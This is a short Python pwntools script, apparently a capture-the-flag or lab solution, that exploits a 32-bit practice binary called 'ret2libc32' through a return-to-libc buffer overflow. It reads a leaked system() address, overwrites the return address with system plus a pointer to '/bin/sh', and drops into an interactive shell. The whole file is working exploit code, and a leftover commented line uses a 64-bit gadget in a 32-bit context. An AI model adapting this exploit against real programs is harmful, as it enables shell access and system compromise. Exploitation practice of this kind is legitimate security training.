from pwn import *

context.arch = "i386"
context.terminal = ['kitty', '-e', 'sh', '-c']

bin_sh_offset = +0x14fa28
payload = 'A' * 0x18

elf = ELF('ret2libc32')
io = process('./ret2libc32')

#pop_ebx = next(elf.search(asm('pop rdi ; ret')))
system = int(io.recv().split('\n')[0],base=16)

payload += p32(system)
payload += 'A' * 0x4
payload += p32(system+bin_sh_offset)

#gdb.attach(io)
io.sendline(payload)
io.interactive()
